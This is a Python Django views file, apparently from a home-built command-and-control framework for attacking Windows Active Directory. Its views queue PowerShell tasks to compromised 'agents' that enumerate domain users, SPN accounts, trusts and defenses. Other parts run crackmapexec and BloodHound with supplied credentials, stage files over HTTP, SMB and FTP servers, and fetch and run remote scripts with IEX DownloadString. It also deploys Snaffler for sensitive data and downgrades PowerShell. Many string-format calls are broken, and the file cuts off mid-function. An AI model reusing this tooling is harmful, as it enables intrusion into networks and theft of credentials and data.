import os
from blog.views import *
from blog.models import *

current_path= os.path.dirname(os.path.abspath(__file__))
tools_path = os.path.normpath(current_path+os.sep+os.pardir)+"/Tools&Scripts"


#### we need to download modules & tools from ../general/ on the windows machine


###### PowerView.ps1 need to >>>> obfuscation
###### Inveigh.ps1   need to >>>> obfuscation


###### To download on agent:
# local python server
# Downloadfile

def linkedin_users(request):
    if request.method=='POST':   
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        comp = request.POST['comp']
        linkedin_mail = request.POST['linkedin_mail']
        linkedin_password = request.POST['linkedin_password']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system("echo '===============linkedin_users===============\nOutPut in the following path:\n{result_dir}' >> {result_path};python ../general/linkedin2username/linkedin2username.py -c {comp} -u {linkedin_mail} -p {linkedin_password} -o {result_dir}".format(result_path,comp,linkedin_mail,linkedin_password,result_dir))
    else:
        return render(request, 'blog/listeners.html')


######  [Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls"        # to invoke-webrequest
#enum
def SPNUsersforKerb(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Accounts for Kerb===============";import-module $env:USERPROFILE\powerview.ps1;Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName;echo "++++++++++++++++++`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

#enum
def EnumSMBShares(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        ip = request.POST['ip']
        username = request.POST['username']
        password = request.POST['password']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system("echo '===============EnumShares===============' >> {result_path};crackmapexec smb {ip} -u {username} -p {password} --shares >> {result_path};".format(result_path,ip,username,password))
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


def TestingCreds_onDC(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        ip = request.POST['ip']
        username = request.POST['username']
        password = request.POST['password']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system("echo '===============Testing Credentials===============' >> {result_path};crackmapexec smb {ip} -u {username} -p {password} >> {result_path}".format(result_path,ip,username,password))
    else:
        return render(request, 'blog/listeners.html')


#enum
#crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
def userenum_withcreds(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        ip = request.POST['ip']
        username = request.POST['username']
        password = request.POST['password']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system("echo '===============CME Users===============\nOutPut in the following path:\n{result_dir}' >> {result_path};crackmapexec smb {ip} -u {username} -p {password} --users > {result_dir}CMEUsers".format(result_dir,result_path,ip,username,password))
    else:
        return render(request, 'blog/listeners.html')


#enum
def ACC_listing(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============useraccount list===============";wmic useraccount list /format:list;echo "++++++++++++++++++`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

#enum
def Adapter(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============ipconfig /all===============";ipconfig /all;echo "++++++++++++++++++`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')
    
#enum
def fbing(request):
    if request.method=='POST':
        agent = request.POST['agent']
        iprange = request.POST['iprange']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        result_path = "../data/listeners/agents/{}/results".format(agent)
        os.system("echo '===============FPING O/P===============' >> {result_path};fping -asgq {iprange} >> {result_path} ".format(iprange,result_path))
    else:
        return render(request, 'blog/listeners.html')

        
#enum
def ArpTable(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============arp -a===============";arp -a;echo "++++++++++++++++++`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


#enum
def DefenseCheck(request, url='', outpath=''):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============FireWall===============";netsh advfirewall show allprofiles;echo "===============Windows Defender status===============";sc query windefend;echo "===============Antimalware status===============";Get-MpComputerStatus;echo "++++++++++++++++++`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


#enum
def systeminfo(request, url='', outpath=''):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============systeminfo===============";systeminfo;echo "++++++++++++++++++`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

#enum
def DomainInfo(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Get-ADDomain===============";Get-ADDomain;echo "++++++++++++++++++`r`n"'
        
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


#enum    
def DomainUsers(request, domain=''):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============USERS===============";Get-ADUser -Filter * | select UserPrincipalName;echo "++++++++++++++++++`r`n"'.format(domain)
        
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


def DomainControllers(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        domain = request.POST['domain']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Domain Controllers===============";import-module $env:USERPROFILE\powerview.ps1;get-domaincontroller -domain {};echo "++++++++++++++++++`r`n"'.format(domain)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


#enum
def EnvValue(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Environment values===============";Get-ChildItem Env: | ft Key,Value;echo "++++++++++++++++++`r`n"'       
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')
    
#enum
def GroupsListing(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============group list===============";wmic group list /format:list;echo "++++++++++++++++++`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')
    
#enum
def Groups(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Get-ADGroup *===============";Get-ADGroup -Filter * | select name;echo "++++++++++++++++++`r`n"'
        
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')
    

#enum
def groupInfo(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        group = request.POST['group']
        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
        task = '(New-Object Net.WebClient).DownloadFileAsync("https://raw.githubusercontent.com/samratashok/ADModule/master/Microsoft.ActiveDirectory.Management.dll", $env:USERPROFILE+"/Microsoft.ActiveDirectory.Management.dll");import-module $env:USERPROFILE\Microsoft.ActiveDirectory.Management.dll;echo "++++++++++++++++++`r`n`t`r`n===============Get-ADGroup===============";Get-ADGroup -Identity "{group}";echo "===============Get-DomainGroupMember===============";Get-ADGroupMember -Identity "{group}";echo "++++++++++++++++++`r`n" '.format(group)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
    else:
        return render(request, 'blog/listeners.html')

#enum
def GroupMembers(request, agent='', groupname=''):
    if request.method=='POST':
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Group Members===============";Get-ADGroupMember -Identity "{}";echo "++++++++++++++++++`r`n"'.format(groupname)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()

    else:
        return render(request, 'blog/listeners.html')


#enum    
def HotFixes(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Hot Fixes===============";wmic qfe get Caption,Description,HotFixID,InstalledOn;echo "++++++++++++++++++`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

#enum    
def Ip4Route(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============IPv4 routing table===============";route print -4;echo "++++++++++++++++++`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')

#enum  
def ListExecPolicies(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Get-ExecutionPolicy===============";Get-ExecutionPolicy -List;echo "++++++++++++++++++`r`n"'       
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

#enum
def ListingModules(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Get-Module===============";Get-Module;echo "++++++++++++++++++`r`n"'
        
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

#enum
def ImportModule(request, agent='', module=''):
    if request.method=='POST':
        task = 'import-module {}'.format(module)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
    else:
        return render(request, 'blog/listeners.html')


#enum    
def loggedinUsers(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Logged-in users ===============";qwinsta;echo "++++++++++++++++++`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')
    

#enum    
def LocalAccListing(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============System(local) accounts list===============";wmic sysaccount list /format:list;echo "++++++++++++++++++`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

#enum
def TrustRelations(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============TrustRelationships===============";(New-Object Net.WebClient).DownloadFileAsync("https://raw.githubusercontent.com/samratashok/ADModule/master/Microsoft.ActiveDirectory.Management.dll", $env:USERPROFILE+"/Microsoft.ActiveDirectory.Management.dll");import-module $env:USERPROFILE\Microsoft.ActiveDirectory.Management.dll;Get-ADTrust -Filter *;echo "++++++++++++++++++`r`n"'
        
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

#enum
#powerview
def TrustMap(request, agent=''):
    if request.method=='POST':
        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Get-DomainTrustMapping===============";import-module $env:USERPROFILE\powerview.ps1;Get-DomainTrustMapping;;echo "++++++++++++++++++`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
    else:
        return render(request, 'blog/listeners.html')

##download on target    
def Download_IWR(request, url='', outpath=''):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task = '[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls";iwr -UseBasicParsing {} -OutFile {}'.format(url, outpath)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

def DownloadFileAsync(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        url = request.POST['url']
        outpath = request.POST['outpath']
        task = "(New-Object Net.WebClient).DownloadFileAsync('{url}', '{outpath}')".format(url, outpath)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

def DownloadString(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        url = request.POST['url']
        task = "IEX (New-Object Net.WebClient).DownloadString('{url}')".format(url)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


def Download_SMB(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        url = request.POST['url']
        task = "copy \\{ip}:{port}\share\{fileName}".format(url)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

def Download_FTP(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        ip = request.POST['ip']
        filename = request.POST['filename']
        outpath = request.POST['outpath']
        task = "(New-Object Net.WebClient).DownloadFile('ftp://{ip}/{filename}', '{outpath}')".format(ip,filename, outpath)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


def open_pythonserver(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        timeout = request.POST['timeout']
        serverport = request.POST['serverport']
        directory = request.POST['directory']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system("echo '===============Python Server===============\nFor {timeout} seconds' >> {result_path}; timeout {timeout} python3 -m http.server --directory {directory} {serverport};".format(timeout,result_path,directory,serverport))
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')

def open_SMBserver(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        timeout = request.POST['timeout']
        serverport = request.POST['serverport']

        directory = request.POST['directory']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system("echo '===============SMB Server===============\nFor {timeout} seconds' >> {result_path}; timeout {timeout} impacket-smbserver share -smb2support {directory} -port {port};".format(timeout,result_path,directory,serverport))
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')

def open_FTPserver(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        timeout = request.POST['timeout']
        serverport = request.POST['serverport']
        directory = request.POST['directory']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system("echo '===============FTP Server===============\nFor {timeout} seconds' >> {result_path}; timeout {timeout}  python3 -m pyftpdlib --port {serverport} --directory {directory};".format(timeout,result_path,directory,serverport))
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')        


def open_PY_UploadServer(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        timeout = request.POST['timeout']
        serverport = request.POST['serverport']
        directory = request.POST['directory']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system("echo '===============Python Upload Server===============\nFor {timeout} seconds' >> {result_path}; timeout {timeout}  python3 -m uploadserver --port {serverport} --directory {directory};".format(timeout,result_path,directory,serverport))
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


def open_FTP_UploadServer(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        timeout = request.POST['timeout']
        serverport = request.POST['serverport']
        directory = request.POST['directory']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system("echo '===============FTP Upload Server===============\nFor {timeout} seconds' >> {result_path}; timeout {timeout}  python3 -m pyftpdlib --port {serverport} --directory {directory} --write;".format(timeout,result_path,directory,serverport))
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')

#enum
def sharp(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        username = request.POST['username']
        password = request.POST['password']
        DCip = request.POST['DCip']
        DomainName = request.POST['DomainName']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"        
        os.system("echo '===============SharpHound===============\nOutPut in the following path:\n{result_dir}' >> {result_path};cd {result_dir};bloodhound-python -u '{username}' -p '{password}' -ns {DCip} -d {DomainName} -c all --zip".format(result_dir,result_path,username,password,DCip,DomainName))
    else:
        return render(request, 'blog/listeners.html')

#sensitive data collector
def snaffler(request, url='', outpath=''):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Snaffler==============="\nOutPut in the following path:\n$env:USERPROFILE;.\$env:USERPROFILE\snaffler.exe -s -d {} -o $env:USERPROFILE\output.log -v data;echo "++++++++++++++++++`r`n"'.format(url, outpath)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


def DowngradePS(request):
    if request.method=='POST':
        agent = request.POST['agent']
        version = request.POST['version']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task='powershell -version {}'.format(version)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


def processes(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Processes===============";wmic process list /format:list;echo "++++++++++++++++++`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


def Dsquery(request):
    if request.method=='POST':
        arg = request.POST['arg']
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============DSquery===============";dsquery {};echo "++++++++++++++++++`r`n"'.format(arg)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')



def TGStickets_GetSPNusers(request):
    if request.method=='POST':
        DCip = request.POST['DCip']
        domain = request.POST['domain']
        username = request.POST['username'] #optional
